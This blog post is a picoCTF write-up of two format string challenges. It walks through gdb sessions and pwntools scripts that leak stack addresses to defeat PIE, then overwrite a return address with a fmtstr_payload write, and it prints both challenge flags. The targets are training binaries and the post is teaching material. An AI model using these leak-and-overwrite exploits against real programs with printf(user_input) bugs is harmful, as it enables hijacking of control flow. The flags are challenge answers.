---
layout: post
title: "Exploiting basic format string vulnerabilities - PicoCTF"
---

It's been a few months since I've last played any CTF challenges, so I hopped on picoCTF and solved some simple binary exploitation ones. I chose two challenges for this writeup that I found quite interesting despite being not too difficult.

For a warm up I'll start with the easier medium difficulty challenge

## PIE TIME 2
_Can you try to get the flag? I'm not revealing anything anymore!!_

In this challenge we are given a binary ```vuln``` and a source code of the binary ```vuln.c```

Running ```checksec``` reveals that PIE is enabled which means that every time the binary is run the program will be loaded at a different address.

```bash
└─[$] checksec vuln                                    
[*] '/home/sausig/picoctf/pie-time-2/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

```
&nbsp;

In the source code there are 2 functions (excluding main) ```call_functions``` and ```win```. 

```c
...
void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer); 

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
...
```
&nbsp;

Inside ```call_functions``` there's a ```printf(buffer)``` call which allows me to perform a format string vulnerability.  I'm not going to explain how format string vulnerabilities work, but here's a great resource which I used when I first learned about them: [Exploit 101 - Format Strings](https://axcheron.github.io/exploit-101-format-strings/){:target="_blank"}

Later in the ```call_function``` the program will ask for an address to which it will then jump. Obviously I want to somehow execute ```win``` but I would need its address and since PIE is enabled the address will be randomized on each execution.

I'll try to leak some addresses off of the stack using the vulnerability. I'll use gdb as my debugger.

By inputting a bunch of ```%p``` we can print values from the stack in an address format

```
gef➤  r

Enter your name:%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
0x5555555592a1 0xfbad2288 0x7fffffffdb10 (nil) (nil) 0x7ffff7f82fd0 (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x20702520702520 0x7fffffffdb70 0x24b11fc267e9600 0x7fffffffdb70 0x555555555441 0x1 0x7ffff7dc6ca8  enter the address to jump to, ex => 0x12345:

```
&nbsp;


There's one address that caught my eye and it's ```0x555555555441```. If I print the address of function ```main``` you can notice that it's ```0x555555555400``` which is very close to the address from the stack.

```
gef➤  p main
$2 = {<text variable, no debug info>} 0x555555555400 <main>
```
&nbsp;

If I disassemble ```main``` you can actually see that ```0x555555555441``` is inside this function. It's also the return address of ```call_functions``` (that part is not important for this challenge).

```
gef➤  disassemble main
Dump of assembler code for function main:
   0x0000555555555400 <+0>:	endbr64
   0x0000555555555404 <+4>:	push   rbp
   0x0000555555555405 <+5>:	mov    rbp,rsp
   0x0000555555555408 <+8>:	lea    rsi,[rip+0xfffffffffffffe9a] 
   0x000055555555540f <+15>:	mov    edi,0xb
   0x0000555555555414 <+20>:	call   0x555555555170 <signal@plt>
   0x0000555555555419 <+25>:	mov    rax,QWORD PTR [rip+0x2bf0]
   0x0000555555555420 <+32>:	mov    ecx,0x0
   0x0000555555555425 <+37>:	mov    edx,0x2
   0x000055555555542a <+42>:	mov    esi,0x0
   0x000055555555542f <+47>:	mov    rdi,rax
   0x0000555555555432 <+50>:	call   0x555555555180 <setvbuf@plt>
   0x0000555555555437 <+55>:	mov    eax,0x0
   0x000055555555543c <+60>:	call   0x5555555552c7 <call_functions>
   0x0000555555555441 <+65>:	mov    eax,0x0 <--- instruction at the address from the stack
...

```
&nbsp;

The thing about PIE is that when a program is loaded at an address (in our example that would be ```0x555555555000```), the offsets of functions, variables, etc. is always going to be the same. In this binary the offset of function main would be ```0x400```. If i print address of ```win``` I see it's ```0x55555555536a``` so the offset of that function would be ```0x36a``` from the base address of where the binary is loaded.

So if the address that I printed from the stack is ```0x555555555441``` I can simply change ```441``` to ```36a```, and use that address as an input which should jump to the ```win``` function. Time to get that flag 

First I need to find out where on the stack is this address. In my local environment it was at 19th place but it could be different for the remote machine. I'll make a simple script in python that will send ```%i$p``` as the input, incrementing the ```i``` each time until I find "411" in the output.

```python
from pwn import *

message = ""
payload = ""
i = 0

while(True):
    payload = f'%{i}$p' 
    r = remote("rescued-float.picoctf.net", 52216)
    payload = payload.encode()
    print(r.recvuntil(':'))
    r.sendline(payload)
    message = str(r.recvline().decode())
    if "441" in message:
        break
    r.recvuntil(b': ')
    r.sendline(b'0x1')
    i = i+1

print(str(payload.decode()))
print(message)

```
&nbsp;

After running the script it shows that it's still at 19th position
```
b'Enter your name:'
%19$p
0x628bffc9a441
```

I'll get the flag manually now.

I have to print the address from stack at 19th position and change 441 to 36a.

```
─[$] nc rescued-float.picoctf.net 52216
Enter your name:%19$p
0x6099b76b4441
 enter the address to jump to, ex => 0x12345: 0x6099b76b436a
You won!
picoCTF{p13_5h0u1dn'7_134k_297076a0}

```

As you can see it wasn't too difficult, but the challenge was a great refresher format string vulns and PIE binaries.

## Echo Valley
_The echo valley is a simple function that echoes back whatever you say to it._<br/>
_But how do you make it respond with something more interesting, like a flag?_

This challenge is a bit more difficult as we will have to do some writing using format string vulnerabilities

It once again provides a binary ```valley``` and its source code ```valley.c```

```checksec``` shows me that PIE is enabled on this binary.

Source code contains functions ```echo_valley``` and ```print_flag```.<br/>
```echo_valley``` has an infinite loop which takes an input of maximum 100 bytes, and prints it back using ```printf(buf)``` which results in a format string vulnerability. We can also exit this function by providing "exit" as the input.<br/>
So just like in the previous challenge we want to somehow return to ```print_flag``` function. I'll load up the binary in gdb and start printing values off of stack.

```
gef➤  r
Welcome to the Echo Valley, Try Shouting: 
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
You heard in the distance: 0x7fffffffd930.(nil).(nil).0x5555555596fc.(nil).0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0xa2e7025.(nil).(nil).(nil).0x59ff645a06328500.0x7fffffffdb60.0x555555555413.0x1.0x7ffff7dc6ca8.0x7fffffffdc60.0x555555555401.
```
&nbsp;

Hmm okay so just like before, there are two addresses that stand out to me: ```0x555555555413``` and ```0x555555555401```<br/>
I decided to print addresses of all the functions and then compare them to those two addresses
```
gef➤  p echo_valley
$1 = {void ()} 0x555555555307 <echo_valley>
gef➤  p main
$2 = {int ()} 0x555555555401 <main>
gef➤  p print_flag
$3 = {void ()} 0x555555555269 <print_flag>
```
&nbsp;

Looks like ```0x555555555401``` is just the address of ```main```. What about the other one?<br/>
Let's disassemble ```main``` and check out what is on that address

```
gef➤  disassemble main
Dump of assembler code for function main:
   0x0000555555555401 <+0>:	endbr64
   0x0000555555555405 <+4>:	push   rbp
   0x0000555555555406 <+5>:	mov    rbp,rsp
   0x0000555555555409 <+8>:	mov    eax,0x0
   0x000055555555540e <+13>:	call   0x555555555307 <echo_valley>
   0x0000555555555413 <+18>:	mov    eax,0x0
   0x0000555555555418 <+23>:	pop    rbp
   0x0000555555555419 <+24>:	ret
End of assembler dump.
```

```0x555555555413``` holds the next instruction after the call to ```echo_valley```. That means it's the return address!<br/>
If I could somehow overwrite it with the address of print_flag I could get retrieve the flag.

First I'll summorize what we already know.
1. return address is somewhere on the stack and has an offset of ```0x413``` from the base address of where the program gets loaded which is ```0x555555555000``` in this example
2. ```print_flag```  has an offset of ```0x269```

That means if I wanted to resume execution at ```print_flag``` I'd have to leak the return address from the stack and subtract ```0x269```. Where do I write this new address?<br/>
Let's analyze the stack right before the vulnerable printf call.<br/>

Put the breakpoint on the call to the vulnerable printf (you can do this by disassembling echo_valley in gdb and checking the address of the last printf call)
```
gef➤  b *0x00005555555553e1
```
&nbsp;

After hitting our breakpoint I'll print the stack
```
gef➤  x/20gx $sp
0x7fffffffdae0:	0x70252e70252e7025	0x252e70252e70252e
0x7fffffffdaf0:	0x2e70252e70252e70	0x70252e70252e7025
0x7fffffffdb00:	0x252e70252e70252e	0x2e70252e70252e70
0x7fffffffdb10:	0x50252e50252e7025	0x252e70252e70252e
0x7fffffffdb20:	0x2e70252e70252e70	0x70252e70252e7025
0x7fffffffdb30:	0x000000000000000a	0x0000000000000000
0x7fffffffdb40:	0x0000000000000000	0x456f5f9094cfdc00
0x7fffffffdb50:	0x00007fffffffdb60	0x0000555555555413
0x7fffffffdb60:	0x0000000000000001	0x00007ffff7dc6ca8
0x7fffffffdb70:	0x00007fffffffdc60	0x0000555555555401
```
&nbsp;

As you can see the value on the stack correspond to the values we are printing out with ```%p```. You can also notice something important.<br/>
The stack address at  ```0x7fffffffdb50```  holds ```0x00007fffffffdb60```, also a stack address. And 8 bytes below ```0x7fffffffdb60``` lies the return address which we have to overwrite!<br/>
That means we can leak the stack address, subtract 8 bytes from it and we get an address to which we can then write the address of print_flag! 

Here's the exploit:
```python
from pwn import *

context.update(arch='amd64', os='linux')
#r = remote("shape-facility.picoctf.net", 58591)
r = process('./valley')

print_flag_offset = 0x1aa

message = ""
payload = f'' 
i = 1

print(str(r.recvuntil(':')))

print(str(r.recvline()))

while(True):
    payload = f'%{i}$p' 
    payload = payload.encode()

    r.sendline(payload)

    message = str(r.recvline().decode())
    print(message)

    if '413' in message:
        print(payload)
        break

    i = i+1


main_address = int(message.split('0x')[1], 16)
print_flag_address = main_address - print_flag_offset

r.sendline(b'%20$p')
message = str(r.recvline().decode())
stack_addr = int(message.split('0x')[1], 16)
write_addr = stack_addr-0x8

payload = fmtstr_payload(6, {write_addr : print_flag_address}, write_size='short')

print(payload)

r.sendline(payload)

r.sendline(b'exit')
print(r.recvline())
print(r.recvline())

```

Here's a quick overview:

```print_flag_offset``` - this is the offset we get from ```original return address - print_flag address```

The program then enters a loop which will check each value from the stack until it finds the return address (so until it finds '413' in the output)<br/>
I convert it to an integer and subtract the ```print_flag_offset``` which gives me the address of ```print_flag```

Then it sends ```%20$p``` . That outputs the stack address which is held on the stack at the 20th position. It then subtracts 8 bytes from it which results in a stack address that holds the return address ```write_addr```.

Lastly it crafts a payload that will overwrite the return address with the ```print_flag_address```.<br/>
You might be confused about ```6``` as the first argument. That's the offset of where the address we wanna write to will be on the stack.<br/>
You can easily check this with:
```
Welcome to the Echo Valley, Try Shouting: 
AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p
You heard in the distance: AAAAAAAA0x7ffdb4ca5d10.(nil).(nil).0x55ac9b84f6d0.(nil).0x4141414141414141.0x70252e70252e7025.0x252e70252e70252e
```
As you can see the ```0x4141414141414141``` is at the 6th position so that's our offset.

After executing the payload we should get a flag!


```
└─[$] python3 exp.py                                                                                                                                                                                   [20:51:5
[+] Opening connection to shape-facility.picoctf.net on port 65477: Done
b'Welcome to the Echo Valley, Try Shouting:'
b' \n'
You heard in the distance: 0x7bc5329dc5c0

You heard in the distance: (nil)

You heard in the distance: (nil)

You heard in the distance: 0x5ad70e60f2b5

You heard in the distance: (nil)

You heard in the distance: 0xa70243625

You heard in the distance: 0x100000

You heard in the distance: 0x8000

You heard in the distance: 0x7fff7f757f18

You heard in the distance: 0x5500000006

You heard in the distance: (nil)

You heard in the distance: (nil)

You heard in the distance: (nil)

You heard in the distance: (nil)

You heard in the distance: (nil)

You heard in the distance: (nil)

You heard in the distance: (nil)

You heard in the distance: (nil)

You heard in the distance: 0x79386bad94bb7d00

You heard in the distance: 0x7fff7f757f50

You heard in the distance: 0x5ad6cffb5413

b'%21$p'
b'%21097c%11$lln%2157c%12$hn%29989c%13$hnaH\x7fu\x7f\xff\x7f\x00\x00L\x7fu\x7f\xff\x7f\x00\x00J\x7fu\x7f\xff\x7f\x00\x00'
b'You heard in the distance:
...
b'Congrats! Here is your flag: picoctf{f1ckl3_f0rmat_f1asc0}\n'

```


